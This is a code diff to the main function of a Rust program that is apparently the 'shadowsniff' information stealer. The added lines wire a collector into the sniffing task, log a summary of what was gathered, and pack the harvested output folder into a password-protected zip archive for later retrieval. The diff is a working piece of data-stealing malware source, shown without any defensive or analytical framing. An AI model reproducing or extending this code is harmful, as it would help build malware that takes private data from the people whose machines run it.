@@ -15,10 +15,15 @@
 
 extern crate alloc;
 
+use alloc::format;
+use collector::atomic::AtomicCollector;
+use collector::DisplayCollector;
 use ipinfo::init_ip_info;
 use shadowsniff::SniffTask;
 use tasks::Task;
+use utils::log_debug;
 use utils::path::Path;
+use zip::ZipArchive;
 
 mod panic;
 
@@ -31,14 +36,29 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     if !init_ip_info() {
         panic!()
     }
-    
+
     let out = Path::new("output");
     let _ = out.remove_dir_all();
     let _ = out.mkdir();
-
+    
+    let collector = AtomicCollector::default();
+    
     unsafe {
-        SniffTask::new().run(&out);
+        SniffTask::default().run(&out, &collector);
     }
+    
+    let displayed_collector = format!("{}", DisplayCollector(collector));
+
+    log_debug!("{displayed_collector}");
+
+    let zip = ZipArchive::default()
+        .add_folder_content(&out)
+        .password("shadowsniff-output")
+        .comment(displayed_collector)
+        .create();
+
+    let out = Path::new("output.zip");
+    let _ = out.write_file(&zip);
 
     0
 }
